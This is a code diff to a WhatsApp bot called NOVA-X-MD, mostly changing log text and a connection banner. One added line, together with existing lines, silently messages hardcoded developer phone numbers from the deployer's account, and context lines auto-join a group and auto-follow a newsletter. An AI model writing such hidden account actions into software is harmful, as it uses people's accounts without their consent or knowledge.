@@ -149,14 +149,15 @@ conn.groupAcceptInvite(inviteCode);
                     require("./plugins/" + plugin);
                 }
             });
-            console.log('NOVA-X-MD Plugins installed 📂')
+            console.log('NOVA-X-MD Plugins Installed 📂')
             console.log(' Bot connected ✅')
 	 
 	 // bot connected notification without admin variable
 conn.sendMessage("94761068032@s.whatsapp.net", { text: "Bot started✅" });
+conn.sendMessage("94741259325@s.whatsapp.net", { text: "Bot started✅" });
 //================== CONNECT MG ==================
 
-let up = "Connected Successfully 🩷🎀\n\n╭───❍「 *✅CONNECTED BOT* 」\n┃ _NOVA-X-MD_\n╰───────────❍\n╭───❍「 *🌐BOT WEB PAGE* 」\n┃ https://king-sandesh-md-ofc-web.pages.dev/\n╰───────────❍\n╭───❍「 *🫳JOIN CHANNEL* 」\n┃ https://whatsapp.com/channel/0029Vb7bwXEEAKWNJgBICJ0w\n┃ https://whatsapp.com/channel/0029Vb5saAU4Y9lfzhgBmS2N\n╰───────────❍\n╭───❍「 *👤BOT OWNER* 」\n┃ _Mr Sandesh Bhashana_\n┃ _Mr. Pathum Malsara_\n╰───────────❍\n╭───❍「 *📈SYSTEM STATUS* 」\n┃ ░░░░░░░░░░░░░░░░░░░ 100%\n╰───────────❍\n╭───❍「 *📍BOT PREFIX* 」\n┃ _Configure Your Prefix_ ${prefix}\n╰───────────❍\n╭───❍「 *⚙️AUTOMATION BY* 」\n┃ > *NOVA X TECHNICAL💸*\n╰───────────❍";
+let up = "> Connected Successfully 🩷🎀\n\n╭───❍「 *✅CONNECTED BOT* 」\n┃ _NOVA-X-MD_\n╰───────────❍\n╭───❍「 *🌐BOT WEB PAGE* 」\n┃ https://king-sandesh-md-ofc-web.pages.dev/\n╰───────────❍\n╭───❍「 *🫳JOIN CHANNEL* 」\n┃ https://whatsapp.com/channel/0029Vb7bwXEEAKWNJgBICJ0w\n┃\n┃ https://whatsapp.com/channel/0029Vb5saAU4Y9lfzhgBmS2N\n╰───────────❍\n╭───❍「 *👤BOT OWNER* 」\n┃ _Mr.Sandesh Bhashana_\n┃ _Mr.Pethum Malsara_\n╰───────────❍\n╭───❍「 *📈SYSTEM STATUS* 」\n┃ ░░░░░░░░░░░░░░░░░░░ 100%\n╰───────────❍\n╭───❍「 *📍BOT PREFIX* 」\n┃ _Configure Your Prefix_ ${prefix}\n╰───────────❍\n╭───❍「 *⚙️AUTOMATION BY* 」\n┃ *NOVA X TECHNICAL 💸*\n╰───────────❍";
 
 conn.sendMessage(conn.user.id,{ text: up, contextInfo: {
         mentionedJid: [''],
@@ -165,11 +166,11 @@ conn.sendMessage(conn.user.id,{ text: up, contextInfo: {
         isForwarded: true,
         forwardedNewsletterMessageInfo: {
           newsletterJid: '120363409414874042@newsletter',
-          newsletterName: "NOVA-X-MD",
+          newsletterName: "𝐍ｏ𝐕𝐀-ｘ Ｍ𝐃",
           serverMessageId: 999
         },
         externalAdReply: { 
-          title: '🧬 LUXALGO BOT 🧬\nSuccessfully Connected !',
+          title: '♣ Nova-X Md ♣\nSuccessfully Connected..!',
           body: 'ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴘᴀᴛʜᴜᴍ ᴍᴀʟꜱᴀʀᴀ',
           mediaType: 1,
           sourceUrl: "",
@@ -218,7 +219,7 @@ const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.
 const metadata = await conn.newsletterMetadata("jid", "120363402220977044@newsletter");
 if (metadata.viewer_metadata === null) {
   await conn.newsletterFollow("120363402220977044@newsletter");
-  console.log("NOVA-X-MD CHANNEL FOLLOW ✅");
+  console.log("NOVA-X-MD CHANNEL FOLLOWED ✅");
 }
 
 
@@ -420,7 +421,7 @@ events.commands.map(async (command) => {
     })
 }
 app.get("/", (req, res) => {
-res.send("NOVA-X-MD CONNECTED SUCCESSFUL✅");
+res.send("NOVA-X-MD CONNECTED SUCCESSFULLY ✅");
 });
 app.listen(port, () => console.log(`NOVA-X-MD Server listening on port http://localhost:` + port));
 setTimeout(() => {
